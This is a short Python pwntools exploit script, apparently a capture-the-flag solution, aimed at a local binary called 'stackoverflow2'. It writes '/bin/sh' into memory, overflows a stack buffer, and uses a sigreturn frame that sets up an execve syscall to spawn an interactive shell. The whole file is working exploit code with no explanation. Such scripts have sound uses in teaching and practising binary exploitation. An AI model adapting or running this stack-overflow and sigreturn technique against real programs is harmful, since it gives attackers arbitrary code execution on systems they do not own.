#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
context.log_level = "debug"
context.arch = 'amd64'

p = process("./stackoverflow2")


wait("me")
p.recvuntil("name: ")
p.sendline("/bin/sh\0")
p.recvuntil("me\n")
p.sendline("a" * 0xe0 + "a" * 40 + p64(0x6010e0) + "a" * 4)
p.recvuntil("[N] ")

frame = SigreturnFrame(kernel="amd64")
frame.rdi = 0x6010e0
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x400750
frame.rax = 0x3b

wait("me")
p.sendline("Y" + "a" * 0x128 + "a" * 3 + str(frame))
    
p.interactive()
